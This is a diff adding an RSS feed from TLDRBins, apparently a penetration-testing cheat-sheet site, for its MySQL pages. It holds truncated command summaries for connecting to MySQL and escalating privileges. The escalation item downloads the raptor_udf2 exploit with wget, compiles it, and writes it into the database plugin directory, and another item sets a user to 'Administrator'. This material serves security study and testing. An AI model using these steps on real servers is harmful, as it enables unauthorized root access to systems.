@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Mysql on TLDRBins</title>
+    <link>https://tldrbins.github.io/@mysql/</link>
+    <description>Recent content in Mysql on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@mysql/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Mysql General</title>
+      <link>https://tldrbins.github.io/mysql_general/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mysql_general/</guid>
+      <description>General Connect to mysql Database # Database unknown mysql -u &amp;lt;USER&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;lt;PASSWORD&amp;gt; # Database known mysql -u &amp;lt;USER&amp;gt; -D &amp;lt;DB_NAME&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;lt;PASSWORD&amp;gt; # Execute query inline mysql -u &amp;lt;USER&amp;gt; -D &amp;lt;DB_NAME&amp;gt; -h &amp;lt;TARGET&amp;gt; -p&amp;lt;PASSWORD&amp;gt; -e &amp;#39;show tables;&amp;#39; Basic Commands # Show all databases show databases; # Choose database use &amp;lt;DB_NAME&amp;gt;; # Show all tables show tables; # Show all entries in table_name select * from &amp;lt;TABLE_NAME&amp;gt;; Update Entry # Update Entry Example UPDATE users set user_type=&amp;#39;Administrator&amp;#39; where email=&amp;#39;test@example.</description>
+    </item>
+    <item>
+      <title>Mysql Privilege Escalation</title>
+      <link>https://tldrbins.github.io/mysql_privilege_escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mysql_privilege_escalation/</guid>
+      <description>Abuse #1: User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -p&amp;lt;PASSWORD&amp;gt; mysql # UDF create table foo(line blob); insert into foo values(load_file(&amp;#39;/dev/shm/raptor_udf2.so&amp;#39;)); # Get plug-in directory show variables like &amp;#39;%plugin%&amp;#39;; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile &amp;#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.</description>
+    </item>
+  </channel>
+</rss>
